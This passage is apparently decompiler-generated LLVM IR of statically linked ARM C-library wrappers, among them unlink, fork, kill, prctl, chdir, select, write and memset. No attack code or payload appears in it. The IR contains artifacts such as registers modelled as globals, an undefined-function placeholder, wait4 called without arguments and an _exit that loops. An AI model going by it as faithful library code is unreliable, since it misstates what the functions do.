  uselistorder i32 %v3_a6a0, { 1, 0 }
  uselistorder i32 %v1_a6a0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_a6a4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_a690, { 1, 0 }
  uselistorder i32 %v4_a68c, { 2, 1, 0 }
  uselistorder i32 %v1_a690, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_a698.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_a664, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_a664, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_a658, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_a6f0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_a6ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a698thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_a758 = udiv i32 %arg1, %arg2
  ret i32 %v2_a758
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_a774 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_a774
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_a790 = load i32, i32* @r0, align 4
  ret i32 %v1_a790
}

define i32 @unlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a794 = load i32, i32* @r7, align 4
  store i32 %v3_a794, i32* %stack_var_-8, align 4
  %v0_a7a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a7a0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a7a0, -4095
  br i1 %tmp, label %dec_label_pc_a7c0, label %dec_label_pc_a7b0

dec_label_pc_a7b0:                                ; preds = %entry
  %v0_a7b0 = call i32 @__GI___errno_location()
  %v0_a7b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_a7b4 = sub i32 0, %v0_a7b4
  %v2_a7b8 = inttoptr i32 %v0_a7b0 to i32*
  store i32 %v1_a7b4, i32* %v2_a7b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_a7c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a7c0

dec_label_pc_a7c0:                                ; preds = %entry, %dec_label_pc_a7b0
  %v1_a7c4 = phi i32 [ %v0_a7a0, %entry ], [ -1, %dec_label_pc_a7b0 ]
  %v2_a7c0 = phi i32 [ %v3_a794, %entry ], [ %v2_a7c0.pre, %dec_label_pc_a7b0 ]
  store i32 %v2_a7c0, i32* @r7, align 4
  ret i32 %v1_a7c4

; uselistorder directives
  uselistorder i32 %v0_a7a0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a7c0, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_a7d8 = load i32, i32* @r0, align 4
  ret i32 %v1_a7d8
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_a7e0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_a7f0 = call i32 @gettimeofday(i32 %v2_a7e0, i32 0)
  %v2_a7f4 = load i32, i32* %stack_var_-16, align 4
  %v2_a7f8 = icmp eq i32* %arg1, null
  br i1 %v2_a7f8, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_a7f4, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_a7f4

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_a840, label %dec_label_pc_a830

dec_label_pc_a830:                                ; preds = %entry
  %v0_a830 = call i32 @__GI___errno_location()
  %v0_a834 = load i32, i32* %r4.global-to-local, align 4
  %v1_a834 = sub i32 0, %v0_a834
  %v2_a838 = inttoptr i32 %v0_a830 to i32*
  store i32 %v1_a834, i32* %v2_a838, align 4
  br label %dec_label_pc_a840

dec_label_pc_a840:                                ; preds = %entry, %dec_label_pc_a830
  %v1_a848 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_a830 ]
  ret i32 %v1_a848

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a840, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a84c = load i32, i32* @r7, align 4
  store i32 %v3_a84c, i32* %stack_var_-8, align 4
  %v0_a858 = load i32, i32* @r0, align 4
  store i32 %v0_a858, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a858, -4095
  br i1 %tmp, label %dec_label_pc_a878, label %dec_label_pc_a868

dec_label_pc_a868:                                ; preds = %entry
  %v0_a868 = call i32 @__GI___errno_location()
  %v0_a86c = load i32, i32* %r7.global-to-local, align 4
  %v1_a86c = sub i32 0, %v0_a86c
  %v2_a870 = inttoptr i32 %v0_a868 to i32*
  store i32 %v1_a86c, i32* %v2_a870, align 4
  %v2_a878.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a878

dec_label_pc_a878:                                ; preds = %entry, %dec_label_pc_a868
  %v1_a87c = phi i32 [ %v0_a858, %entry ], [ -1, %dec_label_pc_a868 ]
  %v2_a878 = phi i32 [ %v3_a84c, %entry ], [ %v2_a878.pre, %dec_label_pc_a868 ]
  store i32 %v2_a878, i32* @r7, align 4
  ret i32 %v1_a87c

; uselistorder directives
  uselistorder i32 %v0_a858, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a878, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_a88c = call i32 @wait4()
  ret i32 %v0_a88c
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_a8cc, label %dec_label_pc_a8bc

dec_label_pc_a8bc:                                ; preds = %entry
  %v0_a8bc = call i32 @__GI___errno_location()
  %v0_a8c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_a8c0 = sub i32 0, %v0_a8c0
  %v2_a8c4 = inttoptr i32 %v0_a8bc to i32*
  store i32 %v1_a8c0, i32* %v2_a8c4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a8cc

dec_label_pc_a8cc:                                ; preds = %entry, %dec_label_pc_a8bc
  %v0_a8cc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_a8bc ]
  ret i32 %v0_a8cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a8cc, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a8dc = load i32, i32* @r7, align 4
  store i32 %v3_a8dc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_a904, label %dec_label_pc_a8f4

dec_label_pc_a8f4:                                ; preds = %entry
  %v0_a8f4 = call i32 @__GI___errno_location()
  %v0_a8f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_a8f8 = sub i32 0, %v0_a8f8
  %v2_a8fc = inttoptr i32 %v0_a8f4 to i32*
  store i32 %v1_a8f8, i32* %v2_a8fc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_a908.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a904

dec_label_pc_a904:                                ; preds = %entry, %dec_label_pc_a8f4
  %v2_a908 = phi i32 [ %v3_a8dc, %entry ], [ %v2_a908.pre, %dec_label_pc_a8f4 ]
  %v0_a904 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_a8f4 ]
  store i32 %v2_a908, i32* @r7, align 4
  ret i32 %v0_a904

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a904, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a910 = load i32, i32* @r7, align 4
  store i32 %v3_a910, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_a938, label %dec_label_pc_a928

dec_label_pc_a928:                                ; preds = %entry
  %v0_a928 = call i32 @__GI___errno_location()
  %v0_a92c = load i32, i32* %r7.global-to-local, align 4
  %v1_a92c = sub i32 0, %v0_a92c
  %v2_a930 = inttoptr i32 %v0_a928 to i32*
  store i32 %v1_a92c, i32* %v2_a930, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_a93c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a938

dec_label_pc_a938:                                ; preds = %entry, %dec_label_pc_a928
  %v2_a93c = phi i32 [ %v3_a910, %entry ], [ %v2_a93c.pre, %dec_label_pc_a928 ]
  %v0_a938 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_a928 ]
  store i32 %v2_a93c, i32* @r7, align 4
  ret i32 %v0_a938

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a938, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a944 = load i32, i32* @r7, align 4
  store i32 %v3_a944, i32* %stack_var_-8, align 4
  %v0_a950 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a950, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a950, -4095
  br i1 %tmp, label %dec_label_pc_a970, label %dec_label_pc_a960

dec_label_pc_a960:                                ; preds = %entry
  %v0_a960 = call i32 @__GI___errno_location()
  %v0_a964 = load i32, i32* %r7.global-to-local, align 4
  %v1_a964 = sub i32 0, %v0_a964
  %v2_a968 = inttoptr i32 %v0_a960 to i32*
  store i32 %v1_a964, i32* %v2_a968, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_a970.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a970

dec_label_pc_a970:                                ; preds = %entry, %dec_label_pc_a960
  %v1_a974 = phi i32 [ %v0_a950, %entry ], [ -1, %dec_label_pc_a960 ]
  %v2_a970 = phi i32 [ %v3_a944, %entry ], [ %v2_a970.pre, %dec_label_pc_a960 ]
  store i32 %v2_a970, i32* @r7, align 4
  ret i32 %v1_a974

; uselistorder directives
  uselistorder i32 %v0_a950, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a970, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_a9b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a9b4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a9b4, -4095
  br i1 %tmp, label %dec_label_pc_a9d4, label %dec_label_pc_a9c4

dec_label_pc_a9c4:                                ; preds = %entry
  %v0_a9c4 = call i32 @__GI___errno_location()
  %v0_a9c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_a9c8 = sub i32 0, %v0_a9c8
  %v2_a9cc = inttoptr i32 %v0_a9c4 to i32*
  store i32 %v1_a9c8, i32* %v2_a9cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a9d4

dec_label_pc_a9d4:                                ; preds = %entry, %dec_label_pc_a9c4
  %v1_a9e0 = phi i32 [ %v0_a9b4, %entry ], [ -1, %dec_label_pc_a9c4 ]
  ret i32 %v1_a9e0

; uselistorder directives
  uselistorder i32 %v0_a9b4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9d4, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_aa20 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_aa20, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_aa20, -4095
  br i1 %tmp, label %dec_label_pc_aa40, label %dec_label_pc_aa30

dec_label_pc_aa30:                                ; preds = %entry
  %v0_aa30 = call i32 @__GI___errno_location()
  %v0_aa34 = load i32, i32* %r7.global-to-local, align 4
  %v1_aa34 = sub i32 0, %v0_aa34
  %v2_aa38 = inttoptr i32 %v0_aa30 to i32*
  store i32 %v1_aa34, i32* %v2_aa38, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aa40

dec_label_pc_aa40:                                ; preds = %entry, %dec_label_pc_aa30
  %v1_aa4c = phi i32 [ %v0_aa20, %entry ], [ -1, %dec_label_pc_aa30 ]
  ret i32 %v1_aa4c

; uselistorder directives
  uselistorder i32 %v0_aa20, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa40, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_aa50 = load i32, i32* @r7, align 4
  store i32 %v3_aa50, i32* %stack_var_-8, align 4
  %v0_aa5c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_aa5c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_aa5c, -4095
  br i1 %tmp, label %dec_label_pc_aa7c, label %dec_label_pc_aa6c

dec_label_pc_aa6c:                                ; preds = %entry
  %v0_aa6c = call i32 @__GI___errno_location()
  %v0_aa70 = load i32, i32* %r7.global-to-local, align 4
  %v1_aa70 = sub i32 0, %v0_aa70
  %v2_aa74 = inttoptr i32 %v0_aa6c to i32*
  store i32 %v1_aa70, i32* %v2_aa74, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_aa7c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_aa7c

dec_label_pc_aa7c:                                ; preds = %entry, %dec_label_pc_aa6c
  %v1_aa80 = phi i32 [ %v0_aa5c, %entry ], [ -1, %dec_label_pc_aa6c ]
  %v2_aa7c = phi i32 [ %v3_aa50, %entry ], [ %v2_aa7c.pre, %dec_label_pc_aa6c ]
  store i32 %v2_aa7c, i32* @r7, align 4
  ret i32 %v1_aa80

; uselistorder directives
  uselistorder i32 %v0_aa5c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa7c, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa88.outer

dec_label_pc_aa88.outer:                          ; preds = %dec_label_pc_aaa0, %entry
  %v0_aa88.ph = phi i32 [ %v0_aa88.pre.pre, %dec_label_pc_aaa0 ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_aa88.ph, -4095
  br label %dec_label_pc_aa88

dec_label_pc_aa88:                                ; preds = %dec_label_pc_aa88.outer, %dec_label_pc_aa88
  br i1 %tmp, label %dec_label_pc_aa88, label %dec_label_pc_aaa0

dec_label_pc_aaa0:                                ; preds = %dec_label_pc_aa88
  %v0_aaa0 = call i32 @__GI___errno_location()
  %v1_aaa4 = sub i32 0, %v0_aa88.ph
  %v2_aaa8 = inttoptr i32 %v0_aaa0 to i32*
  store i32 %v1_aaa4, i32* %v2_aaa8, align 4
  %v0_aa88.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa88.outer

; uselistorder directives
  uselistorder i32 %v0_aa88.ph, { 1, 0 }
  uselistorder label %dec_label_pc_aa88, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_aab0 = load i32, i32* @r7, align 4
  store i32 %v3_aab0, i32* %stack_var_-8, align 4
  %v0_aabc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_aabc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_aabc, -4095
  br i1 %tmp, label %dec_label_pc_aadc, label %dec_label_pc_aacc

dec_label_pc_aacc:                                ; preds = %entry
  %v0_aacc = call i32 @__GI___errno_location()
  %v0_aad0 = load i32, i32* %r7.global-to-local, align 4
  %v1_aad0 = sub i32 0, %v0_aad0
  %v2_aad4 = inttoptr i32 %v0_aacc to i32*
  store i32 %v1_aad0, i32* %v2_aad4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_aadc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_aadc

dec_label_pc_aadc:                                ; preds = %entry, %dec_label_pc_aacc
  %v1_aae0 = phi i32 [ %v0_aabc, %entry ], [ -1, %dec_label_pc_aacc ]
  %v2_aadc = phi i32 [ %v3_aab0, %entry ], [ %v2_aadc.pre, %dec_label_pc_aacc ]
  store i32 %v2_aadc, i32* @r7, align 4
  ret i32 %v1_aae0

; uselistorder directives
  uselistorder i32 %v0_aabc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aadc, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_aae8 = add i32 %arg1, 128
  %v2_aaec = icmp ugt i32 %v1_aae8, 383
  %v0_aaf4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_aaec, i32 %v0_aaf4)
  %v4_aafc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 148) to i32*), align 4
  %v2_ab00 = mul i32 %arg1, 2
  %v2_ab04 = add i32 %v4_aafc, %v2_ab00
  %v3_ab04 = inttoptr i32 %v2_ab04 to i16*
  %v4_ab04 = load i16, i16* %v3_ab04, align 2
  %v6_ab04 = sext i16 %v4_ab04 to i32
  ret i32 %v6_ab04
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 1300)
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_ab34 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_ab34, i32* @r0, align 4
  %v1_ab3c = call i32 @times(i32 %v2_ab34)
  %v2_ab40 = load i32, i32* %stack_var_-24, align 4
  %v2_ab44 = add i32 %v2_ab40, %tmp
  %v2_ab4c = mul i32 %v2_ab44, 10000
  %v1_ab50 = and i32 %v2_ab4c, 2147483632
  ret i32 %v1_ab50

; uselistorder directives
  uselistorder i32 %v2_ab34, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_ab74 = load i32, i32* @r2, align 4
  %v8_ab74 = icmp eq i32 %v0_ab74, 8
  store i1 %v8_ab74, i1* %cpsr_z.global-to-local, align 1
  %v5_ab78 = icmp slt i32 %v0_ab74, 8
  br i1 %v5_ab78, label %dec_label_pc_abd8, label %dec_label_pc_ab7c

dec_label_pc_ab7c:                                ; preds = %entry
  %v4_ab7c = mul i32 %arg2, 256
  %v5_ab7c = or i32 %v4_ab7c, %arg2
  %v4_ab80 = mul i32 %v5_ab7c, 65536
  %v5_ab80 = or i32 %v4_ab80, %v5_ab7c
  store i32 %v5_ab80, i32* %r1.global-to-local, align 4
  %v1_ab8457 = urem i32 %tmp, 4
  %v2_ab8458 = icmp eq i32 %v1_ab8457, 0
  store i1 %v2_ab8458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_ab8458, label %dec_label_pc_ab94, label %bb

bb:                                               ; preds = %dec_label_pc_ab7c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_ab7c ]
  %v3_ab8859 = phi i32 [ %v6_ab88, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_ab7c ]
  %v4_ab88 = inttoptr i32 %v3_ab8859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_ab88, align 1
  %v5_ab88 = load i32, i32* @r3, align 4
  %v6_ab88 = add i32 %v5_ab88, 1
  store i32 %v6_ab88, i32* @r3, align 4
  %v0_ab8c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_ab98.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_ab8c.pr, label %dec_label_pc_ab94, label %.thread

.thread:                                          ; preds = %bb
  %v2_ab8c = add i32 %v0_ab98.pr.pre, -1
  store i32 %v2_ab8c, i32* @r2, align 4
  %v1_ab84 = urem i32 %v6_ab88, 4
  %v2_ab84 = icmp eq i32 %v1_ab84, 0
  store i1 %v2_ab84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab84, label %dec_label_pc_ab94, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_ab88.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_ab88.pre to i8
  br label %bb

dec_label_pc_ab94:                                ; preds = %.thread, %bb, %dec_label_pc_ab7c
  %v0_aba028 = phi i32 [ %tmp, %dec_label_pc_ab7c ], [ %v6_ab88, %bb ], [ %v6_ab88, %.thread ]
  %v0_ab98.pr = phi i32 [ %v0_ab74, %dec_label_pc_ab7c ], [ %v0_ab98.pr.pre, %bb ], [ %v2_ab8c, %.thread ]
  %v0_ab94 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_ab94, i32* @ip, align 4
  %v8_ab9810 = icmp eq i32 %v0_ab98.pr, 8
  store i1 %v8_ab9810, i1* %cpsr_z.global-to-local, align 1
  %v5_ab9c11 = icmp slt i32 %v0_ab98.pr, 8
  br i1 %v5_ab9c11, label %dec_label_pc_abd8, label %dec_label_pc_aba0.preheader

dec_label_pc_aba0.preheader:                      ; preds = %dec_label_pc_ab94
  %v1_aba046 = inttoptr i32 %v0_aba028 to i32*
  store i32 %v0_ab94, i32* %v1_aba046, align 4
  %v3_aba047 = add i32 %v0_aba028, 4
  %v4_aba048 = inttoptr i32 %v3_aba047 to i32*
  %v5_aba049 = load i32, i32* @ip, align 4
  store i32 %v5_aba049, i32* %v4_aba048, align 4
  %v6_aba050 = add i32 %v0_aba028, 8
  store i32 %v6_aba050, i32* @r3, align 4
  %v0_aba451 = load i32, i32* @r2, align 4
  %v1_aba452 = add i32 %v0_aba451, -8
  store i32 %v1_aba452, i32* @r2, align 4
  %v5_abac53 = icmp slt i32 %v1_aba452, 8
  br i1 %v5_abac53, label %dec_label_pc_aba0.dec_label_pc_abd8.loopexit_crit_edge, label %dec_label_pc_abb0

dec_label_pc_abb0:                                ; preds = %dec_label_pc_aba0.preheader, %dec_label_pc_ab98.dec_label_pc_aba0_crit_edge
  %v6_aba055 = phi i32 [ %v6_aba0, %dec_label_pc_ab98.dec_label_pc_aba0_crit_edge ], [ %v6_aba050, %dec_label_pc_aba0.preheader ]
  %v0_aba054 = phi i32 [ %v12_abcc, %dec_label_pc_ab98.dec_label_pc_aba0_crit_edge ], [ %v0_aba028, %dec_label_pc_aba0.preheader ]
  %v1_abb0 = inttoptr i32 %v6_aba055 to i32*
  %v2_abb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_abb0, i32* %v1_abb0, align 4
  %v3_abb0 = add i32 %v0_aba054, 12
  %v4_abb0 = inttoptr i32 %v3_abb0 to i32*
  %v5_abb0 = load i32, i32* @ip, align 4
  store i32 %v5_abb0, i32* %v4_abb0, align 4
  %v6_abb0 = add i32 %v0_aba054, 16
  store i32 %v6_abb0, i32* @r3, align 4
  %v0_abb4 = load i32, i32* @r2, align 4
  %v1_abb4 = add i32 %v0_abb4, -8
  store i32 %v1_abb4, i32* @r2, align 4
  %v5_abbc = icmp slt i32 %v1_abb4, 8
  br i1 %v5_abbc, label %dec_label_pc_abb0.dec_label_pc_abd8.loopexit_crit_edge, label %dec_label_pc_abc0

dec_label_pc_abc0:                                ; preds = %dec_label_pc_abb0
  %v1_abc0 = inttoptr i32 %v6_abb0 to i32*
  %v2_abc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_abc0, i32* %v1_abc0, align 4
  %v3_abc0 = add i32 %v0_aba054, 20
  %v4_abc0 = inttoptr i32 %v3_abc0 to i32*
  %v5_abc0 = load i32, i32* @ip, align 4
  store i32 %v5_abc0, i32* %v4_abc0, align 4
  %v6_abc0 = add i32 %v0_aba054, 24
  store i32 %v6_abc0, i32* @r3, align 4
  %v0_abc4 = load i32, i32* @r2, align 4
  %v1_abc4 = add i32 %v0_abc4, -8
  store i32 %v1_abc4, i32* @r2, align 4
  %v5_abcc = icmp slt i32 %v1_abc4, 8
  br i1 %v5_abcc, label %dec_label_pc_abc0.dec_label_pc_abd8.loopexit_crit_edge, label %dec_label_pc_ab98

dec_label_pc_ab98:                                ; preds = %dec_label_pc_abc0
  %v7_abcc = inttoptr i32 %v6_abc0 to i32*
  %v8_abcc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_abcc, i32* %v7_abcc, align 4
  %v9_abcc = add i32 %v0_aba054, 28
  %v10_abcc = inttoptr i32 %v9_abcc to i32*
  %v11_abcc = load i32, i32* @ip, align 4
  store i32 %v11_abcc, i32* %v10_abcc, align 4
  %v12_abcc = add i32 %v0_aba054, 32
  store i32 %v12_abcc, i32* @r3, align 4
  %v6_abd0 = load i32, i32* @r2, align 4
  %v7_abd0 = add i32 %v6_abd0, -8
  store i32 %v7_abd0, i32* @r2, align 4
  %v5_ab9c = icmp slt i32 %v7_abd0, 8
  br i1 %v5_ab9c, label %dec_label_pc_ab98.dec_label_pc_abd8.loopexit_crit_edge, label %dec_label_pc_ab98.dec_label_pc_aba0_crit_edge

dec_label_pc_ab98.dec_label_pc_aba0_crit_edge:    ; preds = %dec_label_pc_ab98
  %v2_aba0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_aba0 = inttoptr i32 %v12_abcc to i32*
  store i32 %v2_aba0.pre, i32* %v1_aba0, align 4
  %v3_aba0 = add i32 %v0_aba054, 36
  %v4_aba0 = inttoptr i32 %v3_aba0 to i32*
  %v5_aba0 = load i32, i32* @ip, align 4
  store i32 %v5_aba0, i32* %v4_aba0, align 4
  %v6_aba0 = add i32 %v0_aba054, 40
  store i32 %v6_aba0, i32* @r3, align 4
  %v0_aba4 = load i32, i32* @r2, align 4
  %v1_aba4 = add i32 %v0_aba4, -8
  store i32 %v1_aba4, i32* @r2, align 4
  %v5_abac = icmp slt i32 %v1_aba4, 8
  br i1 %v5_abac, label %dec_label_pc_aba0.dec_label_pc_abd8.loopexit_crit_edge, label %dec_label_pc_abb0

dec_label_pc_ab98.dec_label_pc_abd8.loopexit_crit_edge: ; preds = %dec_label_pc_ab98
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_abd8

